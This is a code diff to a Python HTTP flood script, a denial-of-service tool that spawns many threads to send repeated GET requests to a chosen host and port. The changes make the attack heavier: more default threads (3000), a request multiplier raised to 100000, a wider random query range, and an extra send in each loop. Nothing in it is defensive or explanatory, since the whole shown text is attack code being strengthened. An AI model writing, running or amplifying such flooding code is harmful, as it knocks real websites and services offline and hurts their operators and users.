@@ -50,7 +50,7 @@ acceptall = [""]
 
 def logo():
 
-    os.system('color 4')
+    os.system('color a')
 
     print("")
 
@@ -268,11 +268,11 @@ def numthreads():
 
         print("-----------------------------")
 
-        threads = int(input(" Threads [2000]: "))
+        threads = int(input(" Threads [3000]: "))
 
     except ValueError:
 
-        threads = int(2000)
+        threads = int(3000)
 
         print (" Selected Threads " +str(threads)+ " [!]\n")
 
@@ -308,7 +308,7 @@ def attack():
 
     req_code = int(0)
 
-    multiple = int(1000)
+    multiple = int(100000)
 
     connection = "Connection: Keep-Alive\r\n"
 
@@ -352,7 +352,7 @@ class Home(threading.Thread):
 
         else:
 
-            get_host = 'GET' + " /?=" +str(random.randint(0,30000))+ " HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
+            get_host = 'GET' + " /?=" +str(random.randint(0,300000))+ " HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
 
             request  = get_host + useragent + accept + referer + content + length + "\r\n"
 
@@ -383,7 +383,9 @@ class Home(threading.Thread):
                 s.send(str.encode(request))
 
                 s.send(str.encode(request))
-
+                
+                s.send(str.encode(request))
+                
                 print("HTTP Request to The Server "  " => " +str(host_url)+ ":" +str(port))
 
                 try:
